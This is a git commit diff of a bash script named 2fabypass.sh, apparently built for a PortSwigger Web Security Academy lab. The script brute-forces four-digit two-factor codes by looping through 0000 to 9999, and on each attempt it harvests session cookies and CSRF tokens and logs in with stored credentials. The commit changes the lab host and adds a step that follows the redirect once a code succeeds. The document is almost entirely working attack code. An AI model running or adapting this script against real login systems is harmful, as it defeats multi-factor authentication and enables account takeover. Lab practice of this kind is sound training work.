b44386db480ca0e66a17e24e90f26483f98ec1b4
DeusX <ibrahimodunmbaku2@gmail.com>
2024-09-29 09:50:19 +0100

    Update 2fabypass.sh
    Follows redirection after getting a valid otp code and displays full response

--- 2fabypass.sh
+++ 2fabypass.sh
@@ -3,7 +3,7 @@
 for otp in $(seq -w 0000 9999); do
 
     # Request the login page
-    response1=$(curl -X GET https://0aa60028045dcfe58126704400ef00d5.web-security-academy.net/login -v 2>&1)
+    response1=$(curl -X GET https://0aba006704f6168881f2e36e009000e6.web-security-academy.net/login -v 2>&1)
 
     # Extract the first cookie from the set cookie header
     cookie1=$(echo "$response1" | grep 'set-cookie' | awk '{print $3}' | cut -d';' -f1 | cut -d'=' -f2)
@@ -14,7 +14,7 @@ for otp in $(seq -w 0000 9999); do
     echo "csrf token 1: $csrf1"
 
     # Make a login request with the obtained cookie and token
-    response2=$(curl https://0aa60028045dcfe58126704400ef00d5.web-security-academy.net/login -b "session=$cookie1" -d "csrf=$csrf1&username=carlos&password=montoya" -v 2>&1)
+    response2=$(curl https://0aba006704f6168881f2e36e009000e6.web-security-academy.net/login -b "session=$cookie1" -d "csrf=$csrf1&username=carlos&password=montoya" -v 2>&1)
 
     # echo "response 2: $response2"
 
@@ -23,7 +23,7 @@ for otp in $(seq -w 0000 9999); do
     echo "cookie 2: $cookie2"
 
     # Make a get request to the mfa code page using the second cookie
-    response3=$(curl -X GET https://0aa60028045dcfe58126704400ef00d5.web-security-academy.net/login2 -b "session=$cookie2" -v 2>&1)
+    response3=$(curl -X GET https://0aba006704f6168881f2e36e009000e6.web-security-academy.net/login2 -b "session=$cookie2" -v 2>&1)
     
     # echo "response 3: $response3"
 
@@ -31,17 +31,21 @@ for otp in $(seq -w 0000 9999); do
     csrf2=$(echo "$response3" | grep 'name="csrf" value="' | cut -d'"' -f6)
     echo "csrf token 2: $csrf2"
 
-    # response2=$(curl -X GET https://0aa60028045dcfe58126704400ef00d5.web-security-academy.net/login2 -b "session=$cookie" -v 2>&1
+    # response2=$(curl -X GET https://0aba006704f6168881f2e36e009000e6.web-security-academy.net/login2 -b "session=$cookie" -v 2>&1
 
     # csrf2=$(echo "$response2" | grep 'name="csrf" value="' | cut -d'"' -f6)
 
     # Using the second cookie and token, make a post request with an otp code and extract the status code
-    status=$(curl https://0aa60028045dcfe58126704400ef00d5.web-security-academy.net/login2 -b "session=$cookie2" -d "csrf=$csrf2&mfa-code=$otp" -w '%{http_code}' -so /dev/null)
+    status=$(curl https://0aba006704f6168881f2e36e009000e6.web-security-academy.net/login2 -b "session=$cookie2" -d "csrf=$csrf2&mfa-code=$otp" -w '%{http_code}' -so /dev/null)
     echo "Attempting OTP: $otp | Status: $status"
 
     # Valid OTP code 
      if [[ "$status" == "302" ]]; then
           echo "Success with OTP: $otp"
+            # Print the full response after following redirection
+            full_response=$(curl -L https://0aba006704f6168881f2e36e009000e6.web-security-academy.net/login2 -b "session=$cookie2" -d "csrf=$csrf2&mfa-code=$otp" -v 2>&1)
+            echo "Final response after redirection:"
+            echo "$full_response"
           break
       fi
 done
